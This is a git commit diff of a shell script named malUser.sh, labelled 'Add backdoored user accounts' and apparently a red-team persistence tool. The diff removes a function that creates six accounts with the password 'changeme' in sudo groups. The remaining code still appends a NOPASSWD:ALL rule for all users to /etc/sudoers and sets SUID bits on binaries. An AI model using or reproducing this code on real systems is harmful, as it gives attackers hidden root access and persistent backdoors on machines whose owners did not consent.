aa7c1ce0c97a4e6814492ee42a7316536636ae1c
ajcdarkness <33042703+ajcdarkness@users.noreply.github.com>
2020-10-15 22:31:09 -0400

    Update malUser.sh

--- malUser.sh
+++ malUser.sh
@@ -1,10 +1,5 @@
 # Add backdoored user accounts
 #Micah's stubbed out/incomplete modification of Nsswitch 
-QUIET (){
-    eval $@ 2>/dev/null >/dev/null
-    return $?
-}
-
 users_db() {
     # /var/lib/misc on Debian
     # /var/db on RHEL
@@ -46,28 +41,6 @@ users_sudo() {
     echo "ALL ALL=(ALL:ALL) NOPASSWD:ALL" >> "/etc/sudoers";
 };
 
-users_add() {
-    # Add all the following users add wheel/sudo with a password changem
-    for user in "kong" "thanos" "deadpool" "bane" "vader" "yondu"; do
-        QUIET useradd $user;
-        s1=$?;
-        echo "$user:changeme" | chpasswd 2>/dev/null >/dev/null;
-        s2=$?;
-        QUIET usermod -G `grep -oE "wheel|sudo" /etc/group` $user;
-        s3=$?;
-        if [ "$s3$s2$s1" != "000" ]; then
-            fail="$fail $user";
-        fi;
-    done;
-    if [ "$fail" != "" ]; then
-        echo "failed to add users $fail";
-    else
-        echo "Added users"
-    fi;
-
-}
-
-
 tools_suid() {
     # Enable SUID on all the following binaries
     echo "Setting SUID on binaries";
@@ -79,13 +52,12 @@ tools_suid() {
         [ "$?" = "0" ] && LOG 0 "SUID Set on $b";
     done
     return 0;
-}
+};
 
 users() {
     #users_db "$GLOBAL_SERVER";
     echo "Sudoers added"
     users_sudo;
-    users_add;
 };
 
 users;
